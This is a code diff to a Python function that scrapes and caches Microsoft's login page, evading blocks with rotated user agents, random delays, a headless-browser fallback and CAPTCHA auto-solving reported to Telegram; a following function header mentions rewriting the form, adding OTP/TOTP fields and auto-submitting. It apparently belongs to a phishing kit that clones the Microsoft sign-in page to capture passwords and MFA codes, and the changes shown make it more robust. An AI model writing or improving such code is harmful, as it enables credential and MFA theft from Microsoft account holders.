@@ -110,7 +110,12 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
     now = time.time()
     if os.path.exists(cache_path) and now - os.path.getmtime(cache_path) < CACHE_TTL:
         with open(cache_path, "r", encoding="utf-8") as f:
-            return f.read()
+            html = f.read()
+            # If cached file is empty, ignore and refetch
+            if not html.strip():
+                print("[ERROR] Cached HTML is empty, refetching...")
+            else:
+                return html
 
     headers = {"User-Agent": random.choice(USER_AGENTS)}
     time.sleep(random.uniform(1, 2))
@@ -120,9 +125,12 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
         resp = requests.get(url, headers=headers, timeout=10)
         print(f"[DEBUG] Response status: {resp.status_code}")
         print(f"[DEBUG] Response headers: {resp.headers}")
-        if "Access Denied" in resp.text or resp.status_code != 200:
-            print(f"[ERROR] Access Denied or bad status code: {resp.status_code}")
-            raise Exception("Blocked or error")
+
+        # Check for bad response or empty content
+        if resp.status_code != 200 or not resp.text.strip():
+            print(f"[ERROR] Bad response from Microsoft: {resp.status_code}, empty: {not resp.text.strip()}")
+            return "<html><body><h2>Failed to fetch Microsoft login page (bad response).</h2></body></html>"
+
         html = resp.text
         soup = BeautifulSoup(html, "html.parser")
 
@@ -140,9 +148,15 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
                 html = str(soup)
                 send_telegram_message(f"✅ CAPTCHA auto-solved: {captcha_value}")
 
-        with open(cache_path, "w", encoding="utf-8") as f:
-            f.write(html)
-        return html
+        # Only cache if HTML is not empty
+        if html.strip():
+            with open(cache_path, "w", encoding="utf-8") as f:
+                f.write(html)
+        else:
+            print("[ERROR] Fetched HTML is empty, not caching.")
+
+        return html if html.strip() else "<html><body><h2>Failed to fetch Microsoft login page (empty content).</h2></body></html>"
+
     except Exception as e:
         print(f"[ERROR] Exception in fetch_ms_login: {e}")
         if use_browser_fallback:
@@ -155,14 +169,18 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
                 time.sleep(random.uniform(2, 4))
                 html = driver.page_source
                 driver.quit()
-                with open(cache_path, "w", encoding="utf-8") as f:
-                    f.write(html)
-                return html
+                if html.strip():
+                    with open(cache_path, "w", encoding="utf-8") as f:
+                        f.write(html)
+                    return html
+                else:
+                    print("[ERROR] Browser fallback returned empty HTML.")
+                    return "<html><body><h2>Failed to fetch Microsoft login page (browser fallback empty).</h2></body></html>"
             except Exception as e2:
                 print(f"[ERROR] Browser fallback failed: {e2}")
-                return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"
+                return "<html><body><h2>Failed to fetch Microsoft login page (browser fallback error).</h2></body></html>"
         else:
-            return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"
+            return "<html><body><h2>Failed to fetch Microsoft login page (exception).</h2></body></html>"
 
 # === REWRITE FORM + PROXY ASSETS + ADD OTP/TOTP FIELDS + STYLING + AUTO-SUBMIT ===
 def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inputs=False):
